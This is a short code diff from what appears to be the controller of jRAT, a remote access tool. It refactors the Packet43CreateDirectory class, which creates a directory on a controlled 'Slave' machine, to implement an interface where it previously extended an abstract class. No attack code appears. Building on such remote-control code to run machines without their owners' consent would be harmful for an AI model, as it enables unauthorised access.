@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet43CreateDirectory extends AbstractOutgoingPacket {
+public class Packet43CreateDirectory implements OutgoingPacket {
 
 	private String dir;
 	private String name;
